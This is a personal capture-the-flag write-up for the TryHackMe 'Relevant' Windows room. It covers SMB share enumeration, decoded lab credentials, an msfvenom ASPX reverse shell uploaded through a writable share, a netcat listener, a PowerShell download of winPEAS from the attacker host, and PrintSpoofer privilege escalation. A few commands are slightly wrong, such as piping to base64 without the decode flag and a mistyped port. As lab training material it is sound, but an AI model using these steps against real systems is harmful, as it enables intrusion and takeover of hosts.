#tryhackme #ctf 
# Relevant
---

## Nmap
| Port | State | Service | Version |
|-----------|------|---------------|-------------------------|
| 80/tcp    | open | http          | Microsoft IIS httpd 10.0|
| 135/tcp   | open | msrpc         |      Microsoft Windows RPC
| 139/tcp   | open | netbios-ssn   |  Microsoft Windows netbios-ssn 
| 445/tcp   | open | microsoft-ds  | Windows Server 2016 Standard Evaluation 14393 microsoft-ds
| 3389/tcp  | open | ms-wbt-server | Microsoft Terminal Services
| 49663/tcp | open | http          |     Microsoft IIS httpd 10.0
| 49667/tcp | open | msrpc         |    Microsoft Windows RPC
| 49669/tcp | open | msrpc         |    Microsoft Windows RPC

## Smbclient
Use smbclient to list all samba share
`smbclient -L \\\\<machine-ip>`

- *Found shares:*
	- *ADMIN$*
	- *C$*
	- *IPC$*
	- *nt4wrksv*


Connect to *nt4wrksv* share
- *Found passwords.txt* 

Download passwords.txt to attacker machine
`get passwords.txt`

Read the contents on the attacker machine
`cat passwords.txt`

- *Found encoded passwords for users*

Use any online base64 decoder or kali base64 decoder
`cat passwords.txt | base64`

- *Found creds:*
	- **Bob:!P@\$$W0rD!123**
	- **Bill:Juw4nnaM4n420696969!\$$\$**

Use PSExec.py to verify whether the users exist or not (its a windows machine)
- *Bob exists but password is incorrect*
- *Bill does not exist*

*This most probably was a honeypot*


## Gobuster/Dirbuster/Dirsearch
Use gobuster on http port 49963
- *Found /nt4wrksv on port 49963*

*This has the same name as that of samba share*
*To see if it is the same dir used by smb share: 
- Visit **\<machine-ip>:49663/nt4wrksv/passwords.txt** (the file we found using smbclient)
- *Found that it is indeed the same file  and hence the same dir*

Check if we have write permissions on this dir by uploading a file using the smbclient to the same dir and opening again on **\<machine-ip>:49663/nt4wrksv/\<filename>**
- Yes it is!

Use msfvenom to generate payload:
`msfvenom windows/x64/shell_reverse_tcp LHOST=<tun0 ip> LPORT=<port> -f aspx -o pwn.aspx`

Upload this payload to smb share
`put pwn.aspx`

Open a netcat listener on attacker machine:
`rlwrap nc -lvnp <port>`

Now visit **\<machine-ip>/nt4wrksv/pwn.aspx**
- *Gained shell*

`cd \Users\Bob\Desktop` 
`type user.txt`
- *[FLAG 1]*

Windows enumeration ([[Windows-PrivEsc]])

Download winpeas from local python server in the \windows\temp folder ([[Transferring Files]])
`powershell -c "Invoke-WebRequest -Uri 'http://<attacker-ip>:<port>/<path-to-file>' -OutFile 'winpeas.exe'"`
`.\winpeas.exe`


Check privileges
`whoami \priv`
- *We have SeImpersonatePrivilege*

Download [PrintSpoofer.exe](https://github.com/itm4n/PrintSpoofer) and upload to smb share using smbclient
`put printspoofer.exe`

On the victim machine: 
`cd C:\inetpub\wwwroot\nt4wrksv\` 
`PrintSpoofer.exe -i -c cmd`
- *Gained root shell ;)*

`cd \Users\Administrator\Desktop\`
`type root.txt`
- *[FLAG 2]*

---


